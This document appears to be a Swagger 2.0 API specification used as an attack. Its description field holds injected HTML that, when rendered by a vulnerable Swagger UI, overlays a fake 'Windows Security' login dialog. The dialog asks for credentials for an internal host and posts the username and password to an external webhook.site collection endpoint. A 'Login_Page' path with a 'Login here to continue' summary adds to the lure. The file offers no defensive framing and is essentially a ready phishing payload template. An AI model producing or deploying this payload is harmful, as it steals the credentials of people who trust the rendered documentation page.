swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,.2);z-index:99998;font-family:Segoe UI,Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:400px;max-width:94%;background:#f0f0f0;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="background:#0078d7;color:#fff;padding:10px 14px;font-size:14px;font-family:Segoe UI,Arial;display:flex;justify-content:space-between;"><span>Windows Security</span><span style="opacity:.8;">✕</span></div><div style="padding:26px 30px;font-size:14px;color:#1b1b1b;"><div style="margin-bottom:18px;">🔒 Enter your credentials to connect to <strong>internal-api.corp.local</strong></div><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="user" placeholder="Username" style="width:100%;padding:9px;border:1px solid #7a7a7a;box-sizing:border-box;margin-bottom:10px;font-size:14px;"><input type="password" name="pass" placeholder="Password" style="width:100%;padding:9px;border:1px solid #7a7a7a;box-sizing:border-box;margin-bottom:6px;font-size:14px;"><div style="font-size:13px;margin:12px 0 16px;"><label><input type="checkbox" name="remember"> Remember my credentials</label></div><div style="text-align:right;"><button type="submit" style="padding:8px 28px;background:#0078d7;color:#fff;border:none;font-size:14px;margin-right:8px;">OK</button><button type="button" style="padding:8px 28px;background:#e1e1e1;color:#000;border:1px solid #adadad;font-size:14px;">Cancel</button></div></form></div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
